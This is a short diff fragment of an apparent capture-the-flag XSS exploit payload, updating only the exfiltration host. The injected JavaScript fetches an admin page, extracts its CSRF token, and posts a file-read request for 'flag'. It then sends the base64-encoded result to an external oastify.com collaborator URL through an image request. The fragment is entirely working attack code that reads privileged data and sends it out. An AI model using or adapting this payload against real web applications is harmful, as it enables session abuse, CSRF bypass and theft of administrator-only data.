@@ -7,7 +7,7 @@
   let r=await(await fetch('/admin')).text();
   let t=r.match(/value=&quot;(.+?)&quot;/)[1];
   let f=await(await fetch('/admin/file',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`csrf=${t}&file=flag`})).text();
-  new Image().src='https://grb86k8jgt2pvodemslm6c427tdk1fp4.oastify.com/?flag=' + btoa(f);
+  new Image().src='https://277um6o5wfibbat02e18mykonft7hx5m.oastify.com/?flag=' + btoa(f);
 };a()"></xss></textarea>
 </form>
 
